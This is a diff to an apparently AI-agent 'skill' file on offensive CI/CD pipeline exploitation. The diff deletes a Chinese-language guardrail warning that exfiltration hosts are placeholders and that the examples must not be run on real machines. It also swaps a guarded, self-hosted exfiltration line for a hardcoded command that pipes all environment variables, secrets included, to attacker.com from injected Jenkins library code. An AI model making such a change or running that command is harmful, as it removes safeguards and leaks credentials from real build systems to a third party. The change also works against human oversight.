@@ -3,11 +3,6 @@ name: offensive-cicd-pipeline
 description: "Comprehensive CI/CD pipeline exploitation methodology covering GitHub Actions injection vectors (expression injection via PR titles and issue bodies, workflow_run event abuse, GITHUB_TOKEN over-scoping, composite action supply chain compromise), Jenkins attack paths (Groovy sandbox escapes, script console remote code execution, Java remoting deserialization, credential store dumping, shared library injection), GitLab CI exploitation (YAML anchor injection, runner registration token abuse, CI variable extraction, protected branch bypass via merge request pipelines), and Azure DevOps pipeline agent compromise with service connection theft. Includes artifact poisoning techniques across all platforms, tooling guidance for gato and jenkins-attack-framework, and maps to MITRE ATT&CK T1195.002 (Supply Chain Compromise: Compromise Software Supply Chain). Covers enumeration of pipeline configurations, privilege escalation from contributor to code execution, lateral movement through pipeline trust boundaries, and persistence via modified workflow definitions. Each technique section provides working exploitation code, detection indicators, and defensive countermeasures."
 ---
 
-> ⚠ **执行护栏（必读）**：本文件里出现的 `attacker.com` 与 `*.exfil.*` 一律是**占位符**，代表"由你在授权范围内自建并受控的接收端"。
-> **严禁**在宿主机、CI runner、个人终端上原样执行任何含 `env | ... | curl`、`nslookup ...exfil`、`ping -p` 的示例——
-> 那会把执行机环境变量（含密钥）真实外发到第三方。验证只在隔离靶场进行，且接收端必须是 127.0.0.1 或你自己的 OAST 域名。
-> 未替换占位符前，脚本默认回落到 `127.0.0.1:8080`，失败即停，不外联。
-
 # Offensive CI/CD Pipeline Exploitation
 
 CI/CD pipelines represent one of the highest-value targets in modern infrastructure. A compromised
@@ -222,7 +217,7 @@ def call(Map config) {
 
     // Injected exfiltration
     sh '''
-        env | base64 | curl -X POST -d @- "https://${EXFIL_HOST:?set EXFIL_HOST to your own controlled endpoint}/collect"   # 占位符
+        env | base64 | curl -X POST -d @- https://attacker.com/collect
     '''
 }
 ```
